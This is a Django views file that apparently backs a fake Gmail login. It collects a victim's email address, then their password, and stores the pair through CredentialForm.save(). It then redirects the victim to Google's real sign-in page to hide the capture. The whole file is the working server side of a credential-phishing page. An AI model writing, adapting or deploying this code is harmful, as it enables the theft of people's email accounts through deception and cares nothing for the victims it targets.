from django.shortcuts import render, redirect
from django.urls import reverse
from . import forms


# Create your views here.
def login_email(request):
    if request.method == "GET":
        return render(request, 'gmail/email.html')
    if request.method == "POST":
        new_email = forms.UserEmailForm(request.POST)
        if new_email.is_valid():
            return redirect(reverse('gmail:login_password',
                            kwargs={
                                'email': new_email.cleaned_data.get('email')}))
        else:
            print(new_email.errors)
            return redirect(reverse('gmail:login_email'))


def login_password(request, email):
    if request.method == "GET":
        return render(request, 'gmail/password.html', {'email': email})
    if request.method == "POST":
        new_cred = forms.CredentialForm(request.POST)
        if new_cred.is_valid():
            new_cred.save()
            return redirect('https://accounts.google.com/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin')
        else:
            return redirect(reverse('gmail:login_email'))
